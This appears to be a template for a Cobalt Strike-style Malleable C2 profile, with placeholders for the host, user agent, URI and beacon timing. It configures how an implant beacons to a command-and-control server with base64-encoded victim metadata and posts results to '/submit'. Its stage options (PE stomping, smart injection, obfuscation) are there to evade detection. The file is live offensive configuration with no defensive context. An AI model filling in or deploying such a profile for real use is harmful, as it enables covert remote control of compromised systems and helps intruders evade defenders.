set useragent "__USER_AGENT__";
set sleeptime __SLEEP__;
set jitter __JITTER__;

set metadata {
    netbios;
    base64;
}

http-get {
  set uri "__URI__";

  client {
    header "Host" "__HOST__";
    header "Accept" "*/*";
    header "Referer" "https://__HOST__/";
    metadata {
      base64;
    }
  }

  server {
    header "Content-Type" "application/octet-stream";
    output "base64";
  }
}

http-post {
  set uri "/submit";

  client {
    id {
      base64;
    }

    output {
      base64;
    }
  }

  server {
    header "Content-Type" "application/json";
    output "base64";
  }
}

stage {
    set stomppe "true";
    set smartinject "true";
    set userwx "false";
    set compile_time "4";
    set obfuscate "true";
}
